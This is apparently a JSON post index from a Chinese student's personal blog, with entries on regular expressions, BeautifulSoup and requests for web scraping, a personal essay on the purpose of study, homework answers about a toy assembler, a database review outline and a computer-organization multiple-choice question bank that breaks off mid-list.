匹配一个换行符。匹配一个制表符, 等 \\1…\\9 匹配第n个分组的内容。 \\10 匹配第n个分组的内容，如果它经匹配。否则指的是八进制字符码的表达式。 正则表达式实例字符匹配 实例 描述 python 匹配 “python”. 字符类 实例 描述 [Pp]ython 匹配 “Python” 或 “python” rub[ye] 匹配 “ruby” 或 “rube” [aeiou] 匹配中括号内的任意一个字母 [0-9] 匹配任何数字。类似于 [0123456789] [a-z] 匹配任何小写字母 [A-Z] 匹配任何大写字母 [a-zA-Z0-9] 匹配任何字母及数字 [^aeiou] 除了aeiou字母以外的所有字符 [^0-9] 匹配除了数字外的字符 特殊字符类 实例 描述 . 匹配除 “\\n” 之外的任何单个字符。要匹配包括 ‘\\n’ 在内的任何字符，请使用象 ‘[.\\n]’ 的模式。 \\d 匹配一个数字字符。等价于 [0-9]。 \\D 匹配一个非数字字符。等价于 [^0-9]。 \\s 匹配任何空白字符，包括空格、制表符、换页符等等。等价于 [ \\f\\n\\r\\t\\v]。 \\S 匹配任何非空白字符。等价于 [^ \\f\\n\\r\\t\\v]。 \\w 匹配包括下划线的任何单词字符。等价于’[A-Za-z0-9_]’。 \\W 匹配任何非单词字符。等价于 ‘[^A-Za-z0-9_]’。 获取更多Python知识，请移步：菜鸟教程","comments":true,"categories":[{"name":"编程语言","slug":"编程语言","permalink":"http://1905060202.github.io/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"}],"tags":[{"name":"学习","slug":"学习","permalink":"http://1905060202.github.io/tags/%E5%AD%A6%E4%B9%A0/"},{"name":"python","slug":"python","permalink":"http://1905060202.github.io/tags/python/"}]},{"title":"爬虫之数据解析","date":"2021-04-15T14:34:42.000Z","path":"2021/04/15/爬虫之数据解析/","text":"爬虫之数据解析上一节学习了requests模块的使用，这一节学习数据解析。 数据解析分类 正则表达式 bs4 xpath（重要）数据解析原理概述 解析的局部的文本内容都会在标签之间或者标签对应的属性中进行存储 进行指定标签的定位 标签或者标签对应的属性中存储的数据值进行提取（解析）聚焦爬虫 编码流程： 指定url 发起请求 获取响应数据 数据解析 持久化存储学习基础：Python之正则表达式请移步至另一章：python之正则表达式使用bs4进行数据解析数据解析原理： 标签定位 提取标签、标签属性中存储的数据值bs4数据解析原理： 实例化一个BeautifulSoup对象，并且将页面源码数据加载到该对象中 通过调用BeautifulSoup对象中相关的属性或者方法进行标签定位和数据提取 数据解析步骤：环境安装： pip install bs4 pip install lxmlbs4数据解析步骤： 导包，from bs4 import BeautifulSoup 实例化bs4对象的两种方法 1.将本地html文档中的数据加载到该对象中 12fp = open(&#x27;./苏州大学.html&#x27;,&#x27;r&#x27;,encoding=&#x27;utf-8&#x27;)soup = BeautifulSoup(fp,&#x27;lxml&#x27;) 2.将互联网上获取的页面源码加载到该对象中 12page_text = response.textsoup = BeautifulSoup(page_text,&#x27;lxml&#x27;) 提供的用于数据解析的方法和属性：1soup.tagName:返回的是html中第一次出现的tagName标签 1234soup.find(): - find(&#x27;tagName&#x27;):等同于soup.tagName - 属性定位： soup.find(&#x27;div&#x27;,class_或id或attr = &#x27;song&#x27;) 12soup.find_all: - soup.find_all(&#x27;tagName&#x27;):返回符合要求的所有标签（列表），同find，一样拥有属性定位功能 12345soup.select: - soup.select(&#x27;某种选择器(id,class,标签...选择器&#x27;)，返回的是一个列表. 层级选择器: - soup.select(&#x27;.tang &gt; ul &gt; li &gt; a&#x27;)[0] #层级选择器,&gt;代表一个层级(注意两边要有空格),而[n]代表第n个元素 - soup.select(&#x27;.tang &gt; ul a&#x27;) #空格表示多个层级 12345678910111213141516171819202122232425262728293031323334获取标签之间的文本数据: - soup.a.text或者String或者get_text() #两个属性,一个方法 区别: - text或者get_text():可以获取某一个标签中所有的文本内容 - string:只可以获取该标签下面直系的文本内容 实例1: &gt;&gt;&gt; print(soup.select(&#x27;.tang &gt; ul a&#x27;)[0].get_text()) &gt;&gt;&gt; print(soup.select(&#x27;.tang &gt; ul a&#x27;)[0].text) &gt;&gt;&gt; print(soup.select(&#x27;.tang &gt; ul a&#x27;)[0].string) 输出1: &quot;清明时节雨纷纷,路上行人欲断魂,借问酒家何处有,牧童遥指杏花村.&quot; &quot;清明时节雨纷纷,路上行人欲断魂,借问酒家何处有,牧童遥指杏花村.&quot; &quot;清明时节雨纷纷,路上行人欲断魂,借问酒家何处有,牧童遥指杏花村.&quot;实例2: &gt;&gt;&gt; soup.select(&#x27;.tang &#x27;).text &gt;&gt;&gt; soup.select(&#x27;.tang &#x27;).string 输出2: &quot;清明时节雨纷纷,路上行人欲断魂,借问酒家何处有,牧童遥指杏花村.&quot; &quot;秦时明月汉时关,万里长征人未还,但使龙城飞将在,不教胡马度阴山.&quot; &quot;岐王宅里寻常见,崔九堂前几度闻,正是江南好风景,落花时节又逢君.&quot; &quot;杜甫&quot; &quot;None&quot; HTML部分文本(对应上述实例): &lt;div class = &quot;tang&quot;&gt; &lt;ul&gt; &lt;li&gt;&lt;a href = &quot;http://www.baidu.com&quot; title = &quot;qing&quot;&gt;清明时节雨纷纷,路上行人欲断魂,借问酒家何处有,牧童遥指杏花村.&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href = &quot;http://www.163.com&quot; title = &quot;qin&quot;&gt;秦时明月汉时关,万里长征人未还,但使龙城飞将在,不教胡马度阴山.&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href = &quot;http://www.126.com&quot; alt = &quot;qi&quot;&gt;岐王宅里寻常见,崔九堂前几度闻,正是江南好风景,落花时节又逢君.&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href = &quot;http://www.sina.com&quot; class = &quot;du&quot;&gt;杜甫&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; 12345678获取标签中属性值: - soup.a[&#x27;href&#x27;] 实例: &gt;&gt;&gt; print(soup.select(&#x27;.tang &gt; ul a&#x27;)[0][&#x27;href&#x27;])输出: &quot;http://www.baidu.com&quot;","comments":true,"categories":[{"name":"数据分析","slug":"数据分析","permalink":"http://1905060202.github.io/categories/%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90/"}],"tags":[{"name":"学习","slug":"学习","permalink":"http://1905060202.github.io/tags/%E5%AD%A6%E4%B9%A0/"},{"name":"python","slug":"python","permalink":"http://1905060202.github.io/tags/python/"},{"name":"爬虫","slug":"爬虫","permalink":"http://1905060202.github.io/tags/%E7%88%AC%E8%99%AB/"}]},{"title":"爬虫之request模块的学习","date":"2021-04-11T07:16:21.000Z","path":"2021/04/11/爬虫之request模块的学习/","text":"基础知识 统一资源定位符（英语：Uniform Resource Locator，缩写：URL；或称统一资源定位器、定位地址、URL地址，俗称网页地址或简称网址）是因特网上标准的资源的地址（Address），如同在网络上的门牌。它最初是由蒂姆·伯纳斯-李发明用来作为万维网的地址，现在它已经被万维网联盟编制为因特网标准RFC 1738. requests模块：python中原生的一款基于网络请求的模块，功能非常强大，简单便捷，效率极高。 如何使用requests模块呢？ 指定URL 发起请求 获取响应数据 持久化存储 环境安装： pip install requests 利用pycharm，进入File-&gt;Settings-&gt;Project-&gt;Project Interpreter，安装 利用pycharm，新建.py文件，敲入 import requests，将光标移到红线上方，点击install安装 实战编码：胡小宁的github request_test1 request_test2","comments":true,"categories":[{"name":"数据分析","slug":"数据分析","permalink":"http://1905060202.github.io/categories/%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90/"}],"tags":[{"name":"学习","slug":"学习","permalink":"http://1905060202.github.io/tags/%E5%AD%A6%E4%B9%A0/"},{"name":"python","slug":"python","permalink":"http://1905060202.github.io/tags/python/"},{"name":"爬虫","slug":"爬虫","permalink":"http://1905060202.github.io/tags/%E7%88%AC%E8%99%AB/"}]},{"title":"象牙塔里的思考","date":"2021-04-09T14:27:26.000Z","path":"2021/04/09/象牙塔里的思考/","text":"岁月无声。大一刚入学，就听闻教我们《离散数学》的老师是个在学术界叱诧风云的老教授。此人颇为奇怪，从不会阿谀奉承，是学院里为数不多的不带着院长发paper的人。有一次在课上，学院领导催他去听一场国际前沿的讲座，只见他会心一笑，吸了一口到半截的香烟，说：“我就是国际前沿”。有很多老师会点到，这是一种对我们的不信任，亦或许是对自身授课水平的不信任。何教授上课是从来都不会点到的，因为刚开课他就说过：“你们可以来，也可以不来，这是你们的事”。后来，我就真的没再去听他的课了，不得不说，这是一种遗憾。之所以提到何教授，是因为他的求学经历。如果自己对一个人很崇拜，那就一定会去了解他。开课不久，我就查到了他的求学经历。先是在本校读的书，然后去了华南师范大学读硕士，接着去了中山大学读博士，又在苏州大学做了几年博士后。看罢，我就开始幻想能同何教授一样一步步地爬上中国高等教育金字塔的顶端。突然的，一个问题同墨滴入清水一般搅碎了我如痴如醉的幻想。读这么多书的意义何在呢？我想起来自己高考前的心理，“只要能考上好大学，就一定要发个朋友圈好好炫耀一番！”当时我真是这么想的，可以说贯穿了我整个高中思想的魑魅魍魉就是它。直到上大学，或者说再没遇到何教授之前，我还一直保持着这个想法。”我要考研，就是为了证明自己，同时发个朋友圈！“高中我经常刷知乎，总会搜学习方法，逆袭经历，还有各种名牌大学的就读体验。每天晚上蹲坑都要拿手机刷半个小时甚至一个小时才出来，就觉得自己刷完了也能掌握高效的学习方法，也能逆袭到第一名，甚至开始嫌弃某个名牌大学因为宿舍环境不好而不想报考了。这就让我对自身产生了一种幻觉，觉得我本应如此，更何况我还深受一句话的影响：”我生来就是高山而非溪流，我欲于群峰之巅俯视平庸的沟壑。我生来就是人杰而非草芥，我站在伟人之肩藐视卑微的懦夫“。老天是公平的，这种自欺欺人的懒惰的意淫的行为成了使我事与愿违的正当理由。如今看来滑稽可笑的一切，都只是当初为了满足自己发朋友圈的幻想。但我想，这个世界上应该不止我有这种病态的想法。归根溯源，发朋友圈的心理无非是想”炫耀“，而炫耀正是被朋友圈利用的人性的弱点。其实，找工作也好，考研也好，都希望自己能体面一些，而想被人看到自己很”体面“这背后，应该就是想炫耀和证明自己的心理。说回何教授，在看完他的求学经历，我想到在他那个年代虽然没有朋友圈，但考上大学并且读到了名牌大学的博士，就已经是祖坟冒青烟的一件很体面的事了。即使没有朋友圈，十里八乡的亲戚也会把这种事传开，从此家里人在村里会被”高看一眼“。这种被”高看一眼“的心理，实际上就是许多人高考、考研、找工作内心的真实写照。从上大学开始，家里就一直敦促我考研。舅舅当过行长，在阅历上我们一家人都没他丰富，所以报考时也咨询了他的建议。在得知我考入了一所不知名的一本院校时，他给出了最高级的指示，让孩子考研！于是就这样糊里糊涂的，也不知道为了什么努力，每天起床坚持背单词，一天最多背了一千五百多个，然后就糊里糊涂的在一年内考过了六级。其实想想我觉得自己挺牛逼的，哈哈。就这样，有幸与何教授接触一学期后，自己在对求学这件事上有了些许的思考。 求学不是为了炫耀。后来我又接触过陈老师，尹老师，王老师，石老师。这些老师，哦不，应该称之为先生，启蒙了我的思想，让我真正开始思考人生的意义。无论是读书还是工作，让自己保持激情的唯有热爱。这句话是石老师在课上随口而说的一句话，之所以说是随口一说，是因为他整节课都有段子和数不尽的包袱。这句话给了我极大的震撼，让我开始思考自己是否热爱现在所学的专业。当初选择专业时，报考书上是这么形容大数据这个专业的：”既有前途，又有钱途“。我想这能给无数不知何去何从的年轻人指出一条充满希望的路。我想到了小时候坐在电脑前的好奇，也想到了在高二闲暇之余敲出一个小游戏的振奋，还想到了报考前和父母因为专业选择问题舌战的那几个夜晚。那一刻我恍然大悟，原来，求学是为了自己最纯粹的热爱。每个人都应该有家国情怀，之前抖音流行一个段子，好多大学生都在下面冷嘲热讽，只因为拍段子的人学历不高。内容大体上是这样的，一首小bgm响起，然后开始吟诵”为天地立心，为生民立命，为往圣继绝学，为万世开太平“。诚然，求学的最高意义应该是为民族谋复兴，为国家谋进步。但具体到个人，就不必说的那么伟大了。许多人在读研时会感到痛苦，我想原因就归咎于此吧。","comments":true,"categories":[{"name":"闲言碎语","slug":"闲言碎语","permalink":"http://1905060202.github.io/categories/%E9%97%B2%E8%A8%80%E7%A2%8E%E8%AF%AD/"}],"tags":[{"name":"人生","slug":"人生","permalink":"http://1905060202.github.io/tags/%E4%BA%BA%E7%94%9F/"}]},{"title":"OS256t3","date":"2021-03-08T07:51:00.000Z","path":"2021/03/08/OS256t3/","text":"操作系统OS256第三次作业 1.OS256使用什么语言开发？ Javascript。2.从源码来看，OS256由哪两个部分组成？ 软件和硬件。 软件即汇编器，取名为assemble256。 硬件，一台假想的机器，也叫虚拟机，名字为PC256。3.请用”四分五列”详细说明assembler256的指令格式 汇编指令=标号：指令助记符或伪指令 目的操作数，源操作数；注释 伪指令(directive)：不生成机器指令，指导性语句。例如：DB UNTIL。并且伪指令是由汇编器定义的，而不是由CPU定义的。 标号由最多8个英文字母组成，不区分大小写。4.assembler256怎么知道一个字符串是标号？ 如果字符串后有冒号，那他就是标号。5.为什么assembler256的指令里没有操作码？ 因为assembler256是汇编器，它使用的是伪指令，可汇编成操作码。6.源操作数和目的操作数，谁在前，谁在后？ 目的操作数在前，源操作数在后。7.你下载了VS CODE么？或者用了其它什么编辑器？ vscode和webstorm8.assembler256的源码在哪个文件里？PC256呢？ assembler256源码在assets文件夹中的software.js文件里。 PC256源码在assets文件夹中的hardware.js文件里。9.伪指令和指令的区别是什么？ 指令是执行阶段发挥作用的，对应CPU可执行代码，编译时会分配存储单元。 伪指令只是在编译阶段发挥作用，由汇编器来解释，编译时不会给分配存储单元，只是按伪指令的功能定位程序数据或指令位置。10.操作数有哪4种类型？ 操作数有四种类型： (1).number类型 如0，1，100，255,标号 (2).register类型 如A,B,C,D (3).number-address类型 如[0],[1],[2],[255] (4).register-address类型 如[A],[B],[C],[D]11.在assembler256的汇编指令中，中括号的意义是什么？ 中括号表示要访问内存地址。（暂时不确定…）12.UNTIL指令的效果是什么? 从上一个位置填充0直到X为止。13.DB指令有哪几种用法？ （1）在当前位置定义一个字节 DB 7 （2）在当前位置定义Y个X来填充当前位置 DB 13,9 （3）在当前位置定义一个字符串 DB “HELLO” （4）在当前位置定义一个数组 DB [0,1,2,3,4,5,6,7,8,9]14.LocationCounter的作用是什么？ LocationCounter,简写为LC，位置计数器，表示当前code已用长度，初值为0.15.标签数组label[]的作用是什么？ 存储标签，并记录标签所在位置。16.标签出现在冒号的左边和右边，有什么不同？ 出现在左边就是标号，右边会语义出错。17.code[256]和RAM[256]的联系和区别是什么？ 暂时空着…","comments":true,"categories":[{"name":"计算机基础","slug":"计算机基础","permalink":"http://1905060202.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"作业","slug":"作业","permalink":"http://1905060202.github.io/tags/%E4%BD%9C%E4%B8%9A/"},{"name":"操作系统","slug":"操作系统","permalink":"http://1905060202.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}]},{"title":"数据库复习","date":"2021-01-08T00:22:46.000Z","path":"2021/01/08/数据库复习/","text":"HNUST 数据库系统复习数据库系统是计算机科班生必须拿捏的课程，而如果学习这门课，单单是为了应付考试，那么是掌握以下的复习要点，就足够了。但，人生不止一场数据库考试。 数据库复习要点 图1 数据库复习要点 图2 参考文献：2019级大数据二班YGN的总结 复习大纲一、绪论 数据库的4个基本概念。只需要简要描述。 数据库管理系统的主要功能。只需要简要描述。 数据模型的层次。只需简要描述。 数据模型的组成要素。只需简要描述。 信息世界中的基本概念。掌握这些概念。 实体间联系的类型。需要熟练掌握。 关系模型的数据结构。理解相关术语。 数据库系统的三级模式结构。只需要理解并简要描述。 数据库的二级映像功能与数据独立性。只需要理解并简要描述。 数据库系统的组成，各类人员的职责。只需要简要描述。二、关系数据库 关系数据结构的形式化定义。掌握相关定义和记号。 关系的完整性。只需要理解并简要描述。 关系代数。需要熟练掌握各种运算并能综合运用。三、关系数据库语言 基本表的定义。需要熟练掌握。 索引的定义。需要熟练掌握。 数据查询。需要熟练掌握。 数据更新。需要熟练掌握。 视图的定义、查询和更新。需要熟练掌握。四、数据库的完整性和安全性 实体完整性的定义。需要熟练掌握。 参照完整性的定义。需要熟练掌握。 用户定义完整性的定义。需要熟练掌握。 触发器的定义。需要熟练掌握。 实现数据库安全控制的技术。只需简要描述。 常用的存取控制方法。只需要分类简要描述。 数据库的用户和角色。需要熟练掌握。 权限管理。需要熟练掌握。 视图机制。需要熟练掌握。五、关系模式的规范化 函数依赖的定义和分类。需要熟练掌握。 码。需要熟练掌握，最好熟练掌握寻找候选码的算法。 各类范式的含义和判断。需要熟练掌握。 函数依赖的逻辑蕴涵。只需要初步理解。 Armstrong 公理系统。只需简要描述。 属性集的闭包。最好熟练掌握计算属性集闭包的算法。 函数依赖集的极小覆盖。最好熟练掌握计算函数依赖集的极小覆盖的算法。六、数据库设计 数据库设计的基本步骤。只需简要描述。 数据库设计各基本步骤的主要任务。只需简要描述。 E-R 模型。要求熟练使用。 E-R 图向关系模型的转换。需要熟练掌握。、七、事务处理 事务的含义。只需简要描述。 事务的 ACID 特性。只需简要描述。 并发控制操作带来的问题。只需简要描述。 可串行调度。只需简要描述。 冲突可串行的调度。只需简要描述。 并发控制的主要技术。只需简要描述。 封锁的基本类型，封锁的粒度。只需简要描述。 活锁和死锁。只需简要描述。 故障的种类。只需简要描述。 数据库恢复的基本原理和具体实现方法。只需简要描述。 登记日志文件。需要熟练掌握。2021年数据库精讲习题 习题选讲 1习题选讲 2习题选讲 3习题选讲 4习题选讲 5习题选讲 6习题选讲 7习题选讲 8习题选讲 9习题选讲 10习题选讲 11习题选讲 12习题选讲 13习题选讲 14习题选讲 14_2习题选讲 15习题选讲 15_2习题选讲 16习题选讲 16_2习题选讲 17习题选讲 17_2习题选讲 17_3习题选讲 18习题选讲 18_2习题选讲 19习题选讲 20习题选讲20_2习题选讲21习题选讲21_2习题选讲22","comments":true,"categories":[{"name":"计算机基础","slug":"计算机基础","permalink":"http://1905060202.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"习题","slug":"习题","permalink":"http://1905060202.github.io/tags/%E4%B9%A0%E9%A2%98/"},{"name":"数据库","slug":"数据库","permalink":"http://1905060202.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"}]},{"title":"计算机组成原理题库","date":"2021-01-05T11:50:05.000Z","path":"2021/01/05/计算机组成原理题库/","text":"HNUST计算机组成原理题库胡小宁最近陷入了焦灼的状态，想必经历过大学期末考试的同学肯定能感同身受。 计算机组成原理是一片知识汪洋，如果各位同学在上课时没有认真听讲，或者在私下没有认真研读，那么在期末复习时，一定会毫无头绪。好在，计算机学院每年都会在计算机组成原理的题库中选出一些题目作为期末考试的真题。 各位HNUST的同学有福了，本篇内容，将会提供题库中所有的习题供大家复习参考。 因为本篇内容是在2021年初写的，日后题库肯定会有更新，想必彼时胡小宁已经离开学校了，无法继续更新内容。如果有师弟师妹愿意继续将这份事业做下去，请联系胡小宁。 2021年出题重点： 参考文献：2019级大数据二班PPW的总结 一. 单选题（1）DMA访问主存时，向CPU发出请求，获得总线使用权时再进行访存，这种情况称作（B）。 A.停止CPU访问主存 B.周期挪用 C.DMA与CPU交替访问 D.DMA（2）微程序存放在（B）中。 A.存储器控制器 B.控制存储器 C.主存储器 D.Cache（3）CPU响应中断的时间是（B）。 A.中断源提出请求 B.执行周期结束 C.取指周期结束 D.间址周期结束（4）常用的虚拟存储器寻址系统由（B）两级存储器组成。 A.Cache-主存 B.主存-辅存 C.Cache-辅存 D.主存-硬盘（5）计算机操作的最小单位时间是（C）。 A.指令周期 B.CPU周期 C.时钟周期 D.中断周期（6）总线通信中的同步控制是（B）。 A.只适合于CPU控制的方式 B.由统一时序控制的方式 C.只适合于外围设备控制的方式 D.只适合于主存（7）同步控制是（C）。 A.只适合于CPU控制的方式 B.只适合于外围设备控制的方式 C.由统一时序信号控制的方式 D.所有指令控制时间都相同的方式（8）某计算机字长是16位，它的存储容量是1MB，按字编址，它的寻址范围是（A）。 A.512K B.1M C.512KB D.1MB（9）主存和CPU之间增加Cache目的是（A）。 A.解决CPU和主存之间的速度匹配问题 B.扩大主存容量 C.既扩大主存容量，又提高了存取速度 D.扩大辅存容量（10）以下叙述（A）是错误的。 A.一个更高级的中断请求一定可以中断另一个中断处理程序的执行 B.DMA和CPU必须分时使用总线 C.DMA的数据传送不需CPU控制 D.DMA中有中断机制（11）Cache地址映像中，若主存中任一块均可映射到Cache内任一块位置上，称作（B）。 A.直接映像 B.全相联映像 C.组相联映像（12）微指令操作控制字段的每一位代表一个控制信号，这种微程序控制（编码）方式是（A）。 A.直接控制法 B.最短编码法 C.字段直接编译法 D.字段间接编译法（13）下列叙述中是正确的是（C）。 A.程序中断方式中有中断请求，DMA方式中没有中断请求 B.程序中断方式和DMA方式中实现数据传送都需中断请求 C.程序中断方式和DMA方式都有中断请求，但目的不同 D.DMA要等到指令周期结束时才进行周期窃取(14) 在程序的执行过程中，Cache与主存的地址映象是由( D )。 A．程序员调度的； B．操作系统管理的； C．由程序员和操作系统共同协调完成的； D．硬件自动完成的。(15) ( C )对于实现程序浮动提供了较好的支持。 A．间接寻址； B．变址寻址；C．相对寻址；D．直接寻址。(16) 当定点运算发生溢出时，应( C )。 A．向左规格化； B．向右规格化；C．发出出错信息；D．舍入处理。(17) 在下述有关不恢复余数法何时需恢复余数的说法中，( B )是正确的。 A．最后一次余数为正时，要恢复一次余数； B．最后一次余数为负时，要恢复一次余数； C．最后一次余数为0时，要恢复一次余数； D．任何时候都不恢复余数。(18) 目前在小型和微型计算机里最普遍采用的字母与字符编码是( C )。 A．BCD码； B．十六进制代码； C．ASCII码；D．海明码。(19)采用虚拟存储器的主要目的是( B ) A.提高主存储器的存取速度 B.扩大主存储器的存储空间 C.提高外存储器的存取速度 D.扩大外存储器的存储空间(20) 主机与设备传送数据时，采用( A )，主机与设备是串行工作的。 A．程序查询方式； B．中断方式； C．DMA方式； D．通道(21) 变址寻址方式中，操作数的有效地址是( C )。 A．基址寄存器内容加上形式地址（位移量）； B．程序计数器内容加上形式地址； C．变址寄存器内容加上形式地址； D．以上都不对。(22) 微程序控制器中，机器指令与微指令的关系是( B )。 A. 每条机器指令由一条微指令来执行; B. 每一条机器指令由一段微指令编写的微程序来解释执行; C. 每一条机器指令组成的程序可由一条微指令来执行; D. 一条微指令由若干条机器指令组成。(23) 在cache的映射方式中不需要替换策略的是（B）。 A. 全相联映射方式 B. 直接映射方式 C. 组相联映射方式(24) 冯.诺依曼机工作方式的基本特点是（ B ）。 A．多指令流单数据流 B．按地址访问并顺序执行指令 C．堆栈操作(25) 为了便于实现多级中断，保存中断现场最有效的方法是采用（B）。 A. 通用寄存器 B. 堆栈 C. 存储器 D. 外存(26) 若一台计算机的字长为4个字节，则表明（C）。 A. 能处理的数值最大为4位十进制数 B. 能处理的数值最多为4位二进制数组成 C. 在CPU中能作为一个整体处理32位的二进制代码 D. 在CPU中能运算的结果最大为2的32次方(27) 某计算机存储器按字节编址，主存地址空间大小为64MB，现用4M×8位的RAM芯片组成32MB的主存储器，则存储器地址寄存器MAR的位数至少是（ B ）。 A．22位 B．26位 C．25位 D．23位(28) 变址寻址方式中，操作数的有效地址是（ B ）。 A．基址寄存器内容加上形式地址（位移量） B．变址寄存器内容加上形式地址 C．程序计数器内容加上形式地址(29) 向量中断是（ C ）。 A．外设提出中断； B．由硬件形成中断服务程序入口地址； C．由硬件形成向量地址，再由向量地址找到中断服务程序入口地址(30) 隐指令是指（ D ）。 A．操作数隐含在操作码中的指令； B．在一个机器周期里完成全部操作的指令； C．指令系统中已有的指令； D．指令系统中没有的指令。(31)在中断周期中，由（ D ）将允许中断触发器置“0”。 A．关中断指令；B．机器指令；C．开中断指令；D．中断隐指令。(32)在微程序控制器中，一条机器指令的功能通常由（B）。 A．一条微指令实现 B．一段微程序实现 C．一个指令码实现 D．一个条件码实现(33)若采用双符号位补码运算，运算结果的符号位为10，则（ A ）。 A．产生了负溢出（下溢） B．产生了正溢出（上溢） C．运算结果正确，为负数 D．运算结果正确，为正数(34)采用DMA方式传送数据时，每传送一个数据要占用（ D ）的时间。 A.一个指令周期 B.一个机器周期 C.一个时钟周期 D.一个存储周期(35)以某个寄存器的内容为操作数地址的寻址方式称为（ D ）寻址。 A．寄存器 B．相对 C．基址变址 D．寄存器间接(36)微程序控制采用( C )。 A.硬连线逻辑实现 B.组合逻辑电路实现 C.存储逻辑实现 D.时序电路实现(37)如果浮点数尾数用补码表示，则判断下列哪一项的运算结果是规格化数 ( C )。 A.11000 B.0.01110 C.1.00010 D.0.01010(38)若浮点数用补码表示，则判断运算结果是否为规格化数的方法是（C）。 A 阶符与数符相同为规格化数； B 阶符与数符相异为规格化数； C 数符与尾数小数点后第一位数字相异为规格化数。(39)周期挪用方式常用于( D )方式的输入/输出中。 A. 中断 B. 程序传送 C. 通道 D. DMA(40)微型机系统中，主机和高速硬盘进行数据交换一般采用( C )方式。 A. 程序查询 B．程序中断 C．DMA(41) I/O编址方式通常可分统一编址和不统一编址， ( B ) 。 A. 统一编址就是将I/O地址看作是存储器地址的一部分，可用专门的I/O指令对设备进行访问 B. 不统一编址是指I/O地址和存储器地址是分开的，所以对I/O访问必须有专门的I/O指令 C. 统一编址是指I/O地址和存储器地址是分开的，所以可用访存指令实现CPU对设备的访问(42) I/O与主机交换信息的方式中，中断方式的特点是( B ) 。 A．CPU与设备串行工作，传送与主程序串行工作 B．CPU与设备并行工作，传送与主程序串行工作 C．CPU与设备并行工作，传送与主程序并行工作(43)下列叙述中正确的是( C )。 A. 程序中断方式和DMA方式中实现数据传送都需中断请求 B. 程序中断方式中有中断请求，DMA方式中没有中断请求 C. 程序中断方式和DMA方式中都有中断请求，但目的不同(44)硬盘适合于用( A )方式实现输入输出操作 A．DMA B．中断 C．程序查询(45) CPU响应中断的时间是( A ) 。 A．一条指令执行结束 B．外设提出中断 C．取指周期结束(46)主机与I/O设备传送数据时，采用( C ) ，CPU的效率最高。 A. 程序查询方式 B．中断方式 C．DMA方式(47) 至今为止，计算机中的所有信息仍以二进制方式表示，是因为( C )。 A. 节约元件； B. 运算速度快； C. 物理器件的性能决定 ； D 信息处理方便；(48) 计算机的存储器采用分级方式是为了( D )。 A. 减少主机箱的体积 B. 保存大量数据方便 C. 操作方便 D. 解决CPU和内存之间的速度匹配问题(49) 主存储器是计算机系统的记忆设备，它主要用来( C ). A. 存放数据 B. 存放程序 C. 存放数据和程序 D. 存放微程序(50) 寄存器间接寻找方式中，操作数处在( D ). A. 通用寄存器 B. 程序计数器 C. 堆栈 D. 主存单元(51) 指令系统采用不同寻址方式的目的是( B ). A. 实现存贮程序和程序控制； B. 缩短指令长度，扩大寻址空间，提高编程灵活性；。 C. 可直接访问外存； D. 提供扩展操作码的可能并降低指令译码的难度；(52) 计算机中的ALU属于( A )部件。 A. 运算器 B.控制器 C. 寄存器 D.译码器(53) 在CPU中跟踪指令后继地址的寄存器是（ B ）。 A. 主存地址寄存器 B.程序计数器 C.指令寄存器 D.状态条件寄存器(54) 系统总线地址的功能是（ D ）。 A. 选择主存单元地址； B.选择进行信息传输的设备； C. 选择外存地址； D. 指定主存和I / O设备接口电路的地址；(55) 在定点二进制运算器中，减法运算一般通过( D )来实现。 A. 原码运算的二进制减法器 B. 补码运算的二进制减法器 C. 原码运算的十进制加法器 D. 补码运算的二进制加法器(56) 主存贮器和CPU之间增加cache的目的是( A )。 A.解决CPU和主存之间的速度匹配问题 B.扩大主存贮器容量 C.扩大CPU中通用寄存器的数量 D. 既扩大主存贮器容量，又扩大CPU中通用寄存器的数量(57) 以硬连线方式构成的控制器也称( A )。 A.组合逻辑性控制器 B.微程序控制器 C.存储逻辑性控制器 D.运算器(58) 在虚拟存贮器中，当程序正在执行时，由( D )完成地址映射。 A. 程序员 B. 编译器 C.装入程序 D. 操作系统(59) 在单级中断系统中，CPU一旦响应中断，则立即关闭( C )标志，以防本次中断服务结束前同级的其他中断源产生另一次中断进行干扰。 A．中断允许 B. 中断请求 C. 中断屏蔽 D. 中断保护(60) 虚拟存贮器常用地址映象方式是( B )。 A. 组相联 B. 全相联 C. 直接映象 D. 相联(61) 在计算机中能直接被接受的语言为( A )。 A.机器语言 B.汇编语言 C.高级语言 D.数据库语言(62) 垂直型微指令的特点是( C )。 A．微指令格式垂直表示； B．控制信号经过编码产生； C．采用微操作码； D．采用微指令码。(63) 指令寄存器的位数取决于（ B ）。 A．存储器的容量；B．指令字长；C．机器字长；D．存储字长(64) 总线从设备是( C )。 A.掌握总线控制权的设备 B.申请作为从设备的设备 C.被主设备访问的设备 D.总线裁决部件。(65)在计算机中，存放微指令的控制存储器隶属于（ B ）。 A．高速缓存 B．CPU C．内存储器 D．外存。(66) 设机器数字长为32位，一个容量为16MB的存储器，CPU按半字寻址，其寻址范围是（ B ）。 A．224 B．223 C．222 D．221。(67) 在中断接口电路中，向量地址可通过（ B ） 送至CPU。 A．地址线 B．数据线 C．控制线 D．状态线。(68) 指令寄存器的位数取决于（ B ）。 A．存储器的容量；B．指令字长；C．机器字长；D．存储字长(69) 总线的异步通信方式（ A ）。 A．不采用时钟信号，只采用握手信号； B．既采用时钟信号，又采用握手信号； C．既不采用时钟信号，又不采用握手信号； D．采用时钟信号，不采用握手信号。(70) 在磁盘存储器中，查找时间是（ A ）。 A．使磁头移动到要找的柱面上所需的时间； B．在磁道上找到要找的扇区所需的时间； C．在扇区中找到要找的数据所需的时间。 D．以上都不对。(71) 在控制器的控制信号中，相容的信号是（ C ）的信号。 A．可以相互替代； B．可以相继出现； C．可以同时出现； D．不可以同时出现。(72) 在控制器的控制方式中，机器周期内的时钟周期个数可以不相同，这属于（ A ）。 A．同步控制；B．异步控制；C．联合控制；D．局部控制。(73) 